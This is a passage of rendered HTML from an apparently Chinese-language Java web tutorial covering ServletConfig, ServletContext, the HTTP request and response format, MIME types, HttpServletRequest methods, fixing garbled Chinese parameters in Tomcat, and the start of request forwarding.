class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="comment">//1、可以获取Servlet程序的别名servlet-name的值</span></span><br><span class="line">        System.out.println(<span class="string">&quot;HelloServlet程序的别名是:&quot;</span> + servletConfig.getServletName());</span><br><span class="line">        <span class="comment">//2、获取初始化参数init-param</span></span><br><span class="line">        System.out.println(<span class="string">&quot;初始化参数user的值是:&quot;</span> + servletConfig.getInitParameter(<span class="string">&quot;user&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;初始化参数password的值是:&quot;</span> + servletConfig.getInitParameter(<span class="string">&quot;password&quot;</span>));</span><br><span class="line">        <span class="comment">//3、获取ServletContext对象</span></span><br><span class="line">        System.out.println(servletConfig.getServletContext());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p>HelloServlet程序的别名是:HelloServlet<br>初始化参数username的值是;root<br>初始化参数url的值是;123456<br>org.apache.catalina.core.ApplicationContextFacade@7709e74c</p><hr><p><strong>注意：</strong></p><p>当<strong>继承</strong>重写 init(ServletConfig config) 方法的时候，记得调用 super.init(config);</p><p>调用 super.init(config) 的目的，主要是由于在父类（GenericServlet）中有一个ServletConfig实例变量，super.init(config) 就是给这个实例变量赋值。这样在后续的getServletContext()操作，才可以拿到ServletContext对象；否则就会出现java.lang.NullPointerException异常。</p><p>如果重写无参数的init()就不需要调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet2</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="built_in">super</span>.init(config);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ServletContext-类"><a href="#ServletContext-类" class="headerlink" title="ServletContext 类"></a>ServletContext 类</h1><ul><li><p>ServletContext 是一个接口，它表示 Servlet 上下文对象 </p></li><li><p><strong>一个 web 工程，只有一个 ServletContext 对象实例。</strong></p></li><li><p>ServletContext 对象是一个域对象。 </p></li><li><p>ServletContext 是在 web 工程部署启动的时候创建。在 web 工程停止的时候销毁。</p></li></ul><p><strong>域对象</strong>是可以像 Map 一样存取数据的对象，叫域对象。 这里的域指的是存取数据的操作范围，<strong>整个</strong> web 工程。</p><table><thead><tr><th></th><th>存数据</th><th>取数据</th><th>删数据</th></tr></thead><tbody><tr><td>Map</td><td>put（）</td><td>get（）</td><td>remove（）</td></tr><tr><td>域对象</td><td>serAttribute（）</td><td>getAttribute（）</td><td>removeAttribute（）</td></tr></tbody></table><p><strong>ServletContext</strong> <strong>类的四个作用</strong> </p><ol><li><p>获取 web.xml 中配置的上下文参数 context-param </p></li><li><p>获取当前的工程路径，格式: &#x2F;工程路径 </p></li><li><p>获取工程部署后在服务器硬盘上的绝对路径 </p></li><li><p>像 Map 一样存取数据</p></li></ol><hr><p>web.xml 中的配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>id<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>context<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>method<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>test<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ContextServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.nanzx.servlet.ContextServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ContextServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/contextServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Servlet 中的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ContextServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> getServletContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1、获取web.xml中配置的上下文参数context-param</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> context.getInitParameter(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;context-param参数id的值是:&quot;</span> + id);</span><br><span class="line">        System.out.println(<span class="string">&quot;context-param参数method的值是:&quot;</span> + context.getInitParameter(<span class="string">&quot;method&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2、获取当前的工程路径，格式: /工程路径</span></span><br><span class="line">        System.out.println(<span class="string">&quot;当前工程路径:&quot;</span> + context.getContextPath());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3、获取工程部署后在服务器硬盘上的绝对路径</span></span><br><span class="line">        <span class="comment">// 斜杠被服务器解析地址为:http://ip:port/工程名/  映射到IDEA代码的web目录</span></span><br><span class="line">        System.out.println(<span class="string">&quot;工程部署的路径是:&quot;</span> + context.getRealPath(<span class="string">&quot;/&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;工程下css目录的绝对路径是:&quot;</span> + context.getRealPath(<span class="string">&quot;/css&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;工程下imgs目录1.jpg的绝对路径是:&quot;</span> + context.getRealPath(<span class="string">&quot;/imgs/1.jpg&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.像 Map 一样存取数据</span></span><br><span class="line">        System.out.println(<span class="string">&quot;保存之前: Context1 获取 key1的值是:&quot;</span> + context.getAttribute(<span class="string">&quot;key1&quot;</span>));</span><br><span class="line">        context.setAttribute(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Context1 中获取域数据key1的值是:&quot;</span> + context.getAttribute(<span class="string">&quot;key1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p>context-param参数id的值是:context<br>context-param参数method的值是:test<br>当前工程路径:&#x2F;servlet<br>工程部署的路径是:D:\javaProjects\JavaWeb\out\artifacts\JavaWeb_war_exploded<br>工程下css目录的绝对路径是:D:\javaProjects\JavaWeb\out\artifacts\JavaWeb_war_exploded\css<br>工程下imgs目录1.jpg的绝对路径是:D:\javaProjects\JavaWeb\out\artifacts\JavaWeb_war_exploded\imgs\1.jpg<br>保存之前: Context1 获取 key1的值是:null<br>Context1 中获取域数据key1的值是:value1</p><h1 id="Http协议"><a href="#Http协议" class="headerlink" title="Http协议"></a>Http协议</h1><p>http（超文本传输协议）是一个简单的请求-响应协议，它通常运行在TCP之上。它指定了客户端可能发送给服务器什么样的消息以及得到什么样的响应。请求和响应消息的头以ASCII码形式给出；而消息内容则具有一个类似MIME的格式。这个简单模型是早期Web成功的有功之臣，因为它使得开发和部署是那么的直截了当。</p><h2 id="GET-请求"><a href="#GET-请求" class="headerlink" title="GET 请求"></a>GET 请求</h2><ul><li><p>请求行 </p><ul><li>请求的方式GET </li><li>请求的资源路径[+?+请求参数] </li><li>请求的协议的版本号 HTTP&#x2F;1.1</li></ul></li><li><p>请求头 </p><ul><li>key : value 组成 ，不同的键值对，表示不同的含义。</li></ul></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200926114823.png"></p><p>GET 请求有哪些： </p><blockquote><ol><li><p>form 标签 method&#x3D;get </p></li><li><p>a 标签 </p></li><li><p>link 标签引入 css </p></li><li><p>Script 标签引入 js 文件 </p></li><li><p>img 标签引入图片 </p></li><li><p>iframe 引入 html 页面 </p></li><li><p>在浏览器地址栏中输入地址后敲回车</p></li></ol></blockquote><h2 id="POST-请求"><a href="#POST-请求" class="headerlink" title="POST 请求"></a>POST 请求</h2><ul><li><p>请求行</p><ul><li>请求的方式POST</li><li>请求的资源路径[+?+请求参数] </li><li>请求的协议的版本号 HTTP&#x2F;1.1</li></ul></li><li><p>请求头 </p><ul><li>key : value 组成 ，不同的键值对，表示不同的含义。</li></ul></li><li><p><strong>空行</strong> </p></li><li><p>请求体 &#x3D;&#x3D;&#x3D;&gt;&gt;&gt; 就是发送给服务器的数据</p></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200926120009.png"></p><p>POST 请求有： form 标签 method&#x3D;post</p><h2 id="响应的-HTTP-协议格式"><a href="#响应的-HTTP-协议格式" class="headerlink" title="响应的 HTTP 协议格式"></a><strong>响应的</strong> <strong>HTTP</strong> 协议格式</h2><ul><li><p>响应行 </p><ul><li>响应的协议和版本号 </li><li>响应状态码 </li><li>响应状态描述符</li></ul></li><li><p>响应头 </p><ul><li>key : value ，不同的响应头，有其不同含义</li></ul></li><li><p><strong>空行</strong> </p></li><li><p>响应体 —-&gt;&gt;&gt; 就是回传给客户端的数据</p></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200926120818.png"></p><h2 id="常用的响应码说明"><a href="#常用的响应码说明" class="headerlink" title="常用的响应码说明"></a>常用的响应码说明</h2><p>200 表示请求成功 </p><p>302 表示请求重定向 </p><p>404 表示请求服务器已经收到了，但是你要的数据不存在（请求地址错误） </p><p>500 表示服务器已经收到请求，但是服务器内部错误（代码错误） </p><h2 id="MIME类型说明"><a href="#MIME类型说明" class="headerlink" title="MIME类型说明"></a>MIME类型说明</h2><p>MIME 是 HTTP 协议中数据类型。 </p><p>MIME 的英文全称是”Multipurpose Internet Mail Extensions” 多功能 Internet 邮件扩充服务。MIME 类型的格式是“大类型&#x2F;小类型”，并与某一种文件的扩展名相对应。 </p><p>常见的 MIME 类型： </p><table><thead><tr><th>文件</th><th>MIME 类型</th></tr></thead><tbody><tr><td>超文本标记语言文本</td><td>.html , .htm                  text&#x2F;html</td></tr><tr><td>普通文本</td><td>.txt                                 text&#x2F;plain</td></tr><tr><td>RTF文本</td><td>.rtf                                 application&#x2F;rtf</td></tr><tr><td>GIF图形</td><td>.gif                                 image&#x2F;gif</td></tr><tr><td>JPEG图形</td><td>.jpeg，.jpg                    image&#x2F;jpeg</td></tr><tr><td>au声音文件</td><td>.au                                  audio&#x2F;basic</td></tr><tr><td>MIDI音乐文件</td><td>.mid，.midi                   audio&#x2F;midi，audio&#x2F;x-midi</td></tr><tr><td>RealAudio音乐文件</td><td>.ra，.ram                       audio&#x2F;x-pn-realaudio</td></tr><tr><td>MPEG文件</td><td>.mpg，.mpeg                video&#x2F;mpeg</td></tr><tr><td>AVI文件</td><td>.avi                                  video&#x2F;x-msvideo</td></tr><tr><td>GZIP文件</td><td>.gz                                   application&#x2F;x-zip</td></tr><tr><td>TAR文件</td><td>.tar                                  application&#x2F;x-tar</td></tr></tbody></table><h1 id="HttpServletRequest-类"><a href="#HttpServletRequest-类" class="headerlink" title="HttpServletRequest 类"></a>HttpServletRequest 类</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>每次只要有请求进入Tomcat 服务器，Tomcat 服务器就会把请求过来的 HTTP 协议信息解析好封装到 Request 对象中，然后传递到 service 方法（doGet 和 doPost）中给我们使用。我们可以通过 HttpServletRequest 对象，获取到所有请求的信息。</p><h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><ol><li><p>getRequestURI() ：获取请求的资源路径 </p></li><li><p>getRequestURL() ：获取请求的统一资源定位符（绝对路径） </p></li><li><p>getRemoteHost() ：获取客户端的 ip 地址 </p></li><li><p>getHeader() ：获取请求头 </p></li><li><p>getParameter() ：获取请求的参数 </p></li><li><p>getParameterValues() ：获取请求的参数（多个值的时候使用） </p></li><li><p>getMethod() ：获取请求的方式 GET 或 POST </p></li><li><p>setAttribute(key, value)：设置域数据 </p></li><li><p>getAttribute(key)：获取域数据 </p></li><li><p>getRequestDispatcher() ：获取请求转发对象</p></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:8080/servlet/requestServlet&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">    用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    兴趣爱好：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;cpp&quot;</span>&gt;</span>C++</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;java&quot;</span>&gt;</span>Java</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;js&quot;</span>&gt;</span>JavaScript<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;URI =&gt; &quot;</span> + req.getRequestURI());</span><br><span class="line">        System.out.println(<span class="string">&quot;URL =&gt; &quot;</span> + req.getRequestURL());</span><br><span class="line">        System.out.println(<span class="string">&quot;客户端 ip 地址 =&gt; &quot;</span> + req.getRemoteHost());</span><br><span class="line">        System.out.println(<span class="string">&quot;请求头 User-Agent ==&gt;&gt; &quot;</span> + req.getHeader(<span class="string">&quot;User-Agent&quot;</span>));</span><br><span class="line">        System.out.println( <span class="string">&quot;请求的方式 ==&gt;&gt; &quot;</span> + req.getMethod() );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取请求参数</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        String[] hobby = req.getParameterValues(<span class="string">&quot;hobby&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;用户名：&quot;</span> + username);</span><br><span class="line">        System.out.println(<span class="string">&quot;密码：&quot;</span> + password);</span><br><span class="line">        System.out.println(<span class="string">&quot;兴趣爱好：&quot;</span> + Arrays.asList(hobby));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p>URI &#x3D;&gt; &#x2F;servlet&#x2F;requestServlet<br>URL &#x3D;&gt; <a href="http://localhost:8080/servlet/requestServlet">http://localhost:8080/servlet/requestServlet</a><br>客户端 ip 地址 &#x3D;&gt; 0:0:0:0:0:0:0:1<br>请求头 User-Agent &#x3D;&#x3D;&gt;&gt; Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.121 Safari&#x2F;537.36<br>请求的方式 &#x3D;&#x3D;&gt;&gt; GET<br>用户名：<a href="mailto:&#56;&#x33;&#x39;&#x37;&#x37;&#x37;&#52;&#48;&#56;&#x40;&#x71;&#x71;&#x2e;&#x63;&#111;&#109;">&#56;&#x33;&#x39;&#x37;&#x37;&#x37;&#52;&#48;&#56;&#x40;&#x71;&#x71;&#x2e;&#x63;&#111;&#109;</a><br>密码：13486<br>兴趣爱好：[java]</p><h2 id="解决乱码问题"><a href="#解决乱码问题" class="headerlink" title="解决乱码问题"></a>解决乱码问题</h2><p>当username接收的值为中文时，可能出现乱码。</p><p><strong>Get 请求的中文乱码解决：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"></span><br><span class="line">        username = <span class="keyword">new</span> <span class="title class_">String</span>(username.getBytes(<span class="string">&quot;iso-8859-1&quot;</span>), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;用户名：&quot;</span> + username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我的Tomcat是9.0.22版本，不知道是不是以前修改过配置文件，所以上述方法无效。</p><p>可以在Tomcat的conf文件夹里修改server.xml（添加上 URIEncoding&#x3D;”utf-8”）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">URIEncoding</span>=<span class="string">&quot;utf-8&quot;</span> <span class="attr">connectionTimeout</span>=<span class="string">&quot;20000&quot;</span> <span class="attr">port</span>=<span class="string">&quot;8080&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;HTTP/1.1&quot;</span> <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><hr><p>**POST 请求的中文乱码解决: **</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;用户名：&quot;</span> + username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>注意： req.setCharacterEncoding(&quot;UTF-8&quot;);必须在所有请求获得参数前调用</code></p><h2 id="请求转发"><a href="#请求转发" class="headerlink" title="请求转发"></a>请求转发</h2><p>客户浏览器发送http请求—-》web服务器接受此请求–》调用内部的一个方法在容器内部完成请求处理和转发动作—-》将目标资源发送给客户请求转发时，从发送第一次到最后一次请求的过程中，web容器只创建一次request和response对象，新的页面继续处理同一个请求。也可以理解为服务器将request对象在页面之间传递。</p><p><strong>例子：</strong></p><p>你先去了A局，A局看了以后，知道这个事情其实应该B局来管，但是他没有让你自己去找B局，而是让你坐一会儿，自己到后面办公室联系了B局的人，让他们办好后送了过来。</p><p><strong>特点：</strong></p><ol><li>浏览器地址栏没有变化</li><li>他们是一次请求</li><li>他们共享Request域中的数据</li><li>可以转发到WEB-INF目录下，WEB-INF目录下的内容不能直接访问</li><li>不可以访问工程以外的资源</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.RequestDispatcher;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span 